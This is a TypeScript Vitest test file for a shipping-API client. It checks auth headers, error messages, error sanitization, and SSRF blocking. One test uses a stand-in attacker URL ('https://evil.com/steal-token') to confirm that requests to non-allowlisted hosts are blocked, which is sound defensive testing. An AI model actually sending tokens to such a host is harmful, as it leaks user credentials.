/**
 * Tests for the API client
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { EnviaApiClient } from "../../src/utils/api-client.js";
import type { EnviaConfig } from "../../src/config.js";

const mockConfig: EnviaConfig = {
  apiKey: "test-token-123",
  environment: "sandbox",
  shippingBase: "https://api-test.envia.com",
  queriesBase: "https://queries-test.envia.com",
  geocodesBase: "https://geocodes.envia.com",
};

describe("EnviaApiClient", () => {
  let client: EnviaApiClient;

  beforeEach(() => {
    client = new EnviaApiClient(mockConfig);
    vi.restoreAllMocks();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("sends Authorization header with Bearer token", async () => {
    const mockFetch = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: () => Promise.resolve({ data: "ok" }),
    });
    vi.stubGlobal("fetch", mockFetch);

    await client.get("https://api-test.envia.com/test");

    expect(mockFetch).toHaveBeenCalledOnce();
    const callArgs = mockFetch.mock.calls[0];
    expect(callArgs[1].headers.Authorization).toBe("Bearer test-token-123");
  });

  it("returns ok: true for successful responses", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue({
        ok: true,
        status: 200,
        json: () => Promise.resolve({ data: [{ carrier: "dhl" }] }),
      }),
    );

    const result = await client.get("https://api-test.envia.com/test");
    expect(result.ok).toBe(true);
    expect(result.status).toBe(200);
  });

  it("returns friendly error for 401", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue({
        ok: false,
        status: 401,
        json: () => Promise.resolve({ message: "Unauthorized" }),
      }),
    );

    const result = await client.get("https://api-test.envia.com/test");
    expect(result.ok).toBe(false);
    expect(result.error).toContain("Authentication failed");
  });

  it("returns friendly error for 402", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue({
        ok: false,
        status: 402,
        json: () => Promise.resolve({ message: "Insufficient balance" }),
      }),
    );

    const result = await client.post("https://api-test.envia.com/ship/generate/", {});
    expect(result.ok).toBe(false);
    expect(result.error).toContain("Insufficient balance");
  });

  it("returns friendly error for 422", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue({
        ok: false,
        status: 422,
        json: () => Promise.resolve({ message: "Invalid postal code" }),
      }),
    );

    const result = await client.post("https://api-test.envia.com/ship/rate/", {});
    expect(result.ok).toBe(false);
    expect(result.error).toContain("Validation error");
    expect(result.error).toContain("Invalid postal code");
  });

  // --- SSRF Prevention Tests ---

  it("blocks requests to non-Envia domains (SSRF prevention)", async () => {
    const mockFetch = vi.fn();
    vi.stubGlobal("fetch", mockFetch);

    const result = await client.get("https://evil.com/steal-token");

    expect(result.ok).toBe(false);
    expect(result.error).toContain("Blocked");
    expect(result.error).toContain("unauthorized host");
    // fetch should NEVER be called
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it("blocks requests with invalid URLs", async () => {
    const mockFetch = vi.fn();
    vi.stubGlobal("fetch", mockFetch);

    const result = await client.get("not-a-valid-url");

    expect(result.ok).toBe(false);
    expect(result.error).toContain("Blocked");
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it("allows requests to all valid Envia domains", async () => {
    const mockFetch = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: () => Promise.resolve({ data: "ok" }),
    });
    vi.stubGlobal("fetch", mockFetch);

    // Test all 6 allowed domains
    for (const domain of [
      "api-test.envia.com",
      "api.envia.com",
      "queries-test.envia.com",
      "queries.envia.com",
      "geocodes.envia.com",
    ]) {
      const result = await client.get(`https://${domain}/test`);
      expect(result.ok).toBe(true);
    }
  });

  // --- Error Sanitization Tests ---

  it("does not leak full response body in error messages", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue({
        ok: false,
        status: 500,
        json: () =>
          Promise.resolve({
            internal_path: "/srv/api/v2/handler.js",
            stack: "Error at line 42...",
            db_query: "SELECT * FROM users",
          }),
      }),
    );

    const result = await client.get("https://api-test.envia.com/test");
    expect(result.ok).toBe(false);
    // Should NOT contain internal details
    expect(result.error).not.toContain("internal_path");
    expect(result.error).not.toContain("SELECT");
    expect(result.error).not.toContain("stack");
  });

  it("does not leak raw network error details", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockRejectedValue(new Error("getaddrinfo ENOTFOUND internal-api.vpc.envia.com")),
    );

    const result = await client.get("https://api-test.envia.com/test");
    expect(result.ok).toBe(false);
    // Should NOT contain internal hostname
    expect(result.error).not.toContain("internal-api.vpc");
    expect(result.error).not.toContain("ENOTFOUND");
    expect(result.error).toContain("Network error");
  });

  it("sends JSON body for POST requests", async () => {
    const mockFetch = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: () => Promise.resolve({ data: [] }),
    });
    vi.stubGlobal("fetch", mockFetch);

    const body = { origin: { country: "MX" } };
    await client.post("https://api-test.envia.com/ship/rate/", body);

    const callArgs = mockFetch.mock.calls[0];
    expect(callArgs[1].method).toBe("POST");
    expect(callArgs[1].body).toBe(JSON.stringify(body));
    expect(callArgs[1].headers["Content-Type"]).toBe("application/json");
  });
});
